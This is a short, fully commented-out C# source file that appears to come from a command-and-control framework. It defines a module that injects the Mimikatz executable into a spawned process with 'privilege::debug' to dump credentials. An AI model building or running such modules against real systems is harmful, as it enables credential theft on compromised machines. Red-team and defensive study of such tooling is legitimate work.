//using Commander.Commands.Inject;
//using Commander.Communication;
//using Commander.Executor;
//using Commander.Terminal;
//using System;
//using System.Collections.Generic;
//using System.CommandLine;
//using System.IO;
//using System.Linq;
//using System.Text;
//using System.Threading.Tasks;

//namespace Commander.Commands.Module
//{
//    public class MimikatzCommand : SpawnInjectModuleCommand
//    {
//        public override string ExeName => "mimikatz64.exe";

//        public override string Name => "mimikatz";

//        public override string Description => "Inject a Mimikatz executable with parameters";

//        public override string ComputeParams(string innerParams)
//        {
//            return $"privilege::debug {innerParams} exit";
//        }

//    }
//}
